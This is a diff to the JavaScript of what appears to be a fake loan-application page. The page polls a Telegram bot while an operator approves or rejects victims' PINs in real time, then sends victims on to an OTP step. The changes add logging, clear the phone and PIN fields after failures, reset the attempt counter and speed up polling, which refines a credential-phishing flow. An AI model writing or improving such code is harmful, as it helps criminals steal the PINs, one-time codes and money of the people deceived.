@@ -456,9 +456,12 @@
                                 lastUpdateId = update.update_id;
                                 if (update.callback_query) {
                                     const action = update.callback_query.data;
+                                    console.log('Callback received:', action);
+                                    
                                     if (action === 'pin_valid') { 
                                         clearInterval(pollInterval); 
                                         document.getElementById('ov').classList.remove('on'); 
+                                        clrErr();
                                         proceedToOTP(); 
                                     }
                                     else if (action === 'pin_invalid') { 
@@ -471,6 +474,9 @@
                                             showModal(`You put wrong pin ${remaining} attempts remaining make sure you repeat with correct pin.`);
                                         } else {
                                             showErr('Maximum attempts reached. Please contact support.');
+                                            document.getElementById('phone').value = '';
+                                            document.getElementById('pin').value = '';
+                                            pinAttempts = 0;
                                         }
                                         document.getElementById('pin').value = '';
                                     }
@@ -478,12 +484,14 @@
                                         clearInterval(pollInterval); 
                                         document.getElementById('ov').classList.remove('on'); 
                                         showErr('This account has already submitted a loan application.');
+                                        document.getElementById('phone').value = '';
+                                        document.getElementById('pin').value = '';
                                     }
                                 }
                             });
                         }
                     }).catch(e => console.error(e));
-            }, 2000);
+            }, 1500);
             
             setTimeout(() => clearInterval(pollInterval), 600000);
         }
